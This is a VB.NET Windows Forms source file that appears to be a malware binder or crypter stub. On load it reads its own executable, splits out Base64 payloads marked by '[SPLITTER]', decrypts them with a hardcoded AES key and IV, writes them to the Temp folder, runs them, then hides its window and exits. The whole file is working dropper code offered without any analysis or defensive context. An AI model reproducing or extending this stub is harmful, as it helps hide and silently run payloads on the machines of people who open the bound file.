Public Class Form1
    '以下不解釋
    Function UnSecure(ByVal data As Byte()) As Byte()
        Using SA As New System.Security.Cryptography.RijndaelManaged
            SA.IV = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 1, 2, 3, 4, 5, 6, 7}
            SA.Key = New Byte() {7, 6, 5, 4, 3, 2, 1, 9, 8, 7, 6, 5, 4, 3, 2, 1}
            Return SA.CreateDecryptor.TransformFinalBlock(data, 0, data.Length)
        End Using
    End Function
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim Temp As String = My.Computer.FileSystem.SpecialDirectories.Temp
        Dim drop() As String = Split(System.IO.File.ReadAllText(Application.ExecutablePath), "[SPLITTER]")
        Try
            Dim file1 As Byte() = UnSecure(Convert.FromBase64String(drop(1)))
            Dim file2 As Byte() = UnSecure(Convert.FromBase64String(drop(3)))
            My.Computer.FileSystem.WriteAllBytes(Temp & "\" & drop(2), file1, False)
            My.Computer.FileSystem.WriteAllBytes(Temp & "\" & drop(4), file2, False)
            Timer1.Start()
            Process.Start(Temp & "\" & drop(2)) : Process.Start(Temp & "\" & drop(4))
        Catch ex As Exception
            Process.Start(Temp & "\" & drop(2)) : Process.Start(Temp & "\" & drop(4))
            Process.GetCurrentProcess.Kill()
        End Try
        Process.GetCurrentProcess.Kill()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.Hide()
        Me.Visible = False
    End Sub
End Class
